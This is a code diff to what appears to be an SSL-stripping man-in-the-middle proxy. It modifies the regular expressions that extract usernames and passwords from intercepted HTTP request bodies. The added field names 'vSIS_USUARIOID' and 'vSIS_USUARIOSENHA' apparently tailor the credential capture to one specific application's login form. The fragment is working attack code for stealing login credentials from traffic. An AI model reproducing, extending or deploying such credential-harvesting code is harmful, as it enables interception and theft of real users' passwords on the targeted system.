@@ -349,8 +349,8 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 			if modified:
 				print "[+] Modified Body:"
 				print req_body
-		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Ll]ogin|[Ll]ogin[Ii][Dd]|[Uu]name|[Uu]suario)=([^&|;]*)'
-                pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
+		user_regex = '(vSIS_USUARIOID|[Ee]mail|[Uu]ser|[Uu]sername|[Ll]ogin|[Ll]ogin[Ii][Dd]|[Uu]name|[Uu]suario)=([^&|;]*)'
+                pw_regex = '(vSIS_USUARIOSENHA|[Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
 		plain_text = str(req_body.replace("\n"," "))
 		users = re.findall(user_regex, plain_text)
                 passwords = re.findall(pw_regex, plain_text)
